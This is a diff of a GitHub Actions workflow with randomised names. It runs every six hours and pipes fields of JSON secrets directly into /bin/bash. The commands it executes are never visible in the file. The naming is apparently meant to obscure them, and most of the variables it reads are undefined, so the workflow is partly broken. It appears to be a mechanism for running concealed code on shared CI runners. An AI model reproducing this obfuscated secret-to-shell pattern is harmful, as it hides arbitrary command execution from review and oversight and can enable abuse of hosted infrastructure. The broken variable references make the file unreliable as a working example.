@@ -1,22 +1,26 @@
 name: nongqizheng3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
-
+    - cron: '2 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: nongqizheng3456
         env:
-          : ${{ secrets. }}
+          yhhcg1804: ${{ secrets.yhhcg1804 }}
         run: |
-          echo $ | jq -r . | /bin/bash
-          echo $pw | jq -r . | /bin/bash
-          echo $ | jq -r . | /bin/bash
-          echo $ | jq -r . | /bin/bash
-          echo $ | jq -r . | /bin/bash
+          echo $yhhcg1804 | jq -r .pgjk622 | /bin/bash
+          echo $jwii4 | jq -r .lpn03 | /bin/bash
+          echo $joucj25 | jq -r .w724 | /bin/bash
+          echo $trnpd53 | jq -r .h096 | /bin/bash
+          echo $oiwhl05 | jq -r .t172 | /bin/bash
+          echo $gshn059 | jq -r .yinvx7711 | /bin/bash
+          echo $tohek4964 | jq -r .o29177 | /bin/bash
+          echo $wotgw8699 | jq -r .l55519 | /bin/bash
+          echo $llim725 | jq -r .xqgov08 | /bin/bash
+          echo $wl5 | jq -r .gejwb91 | /bin/bash
 
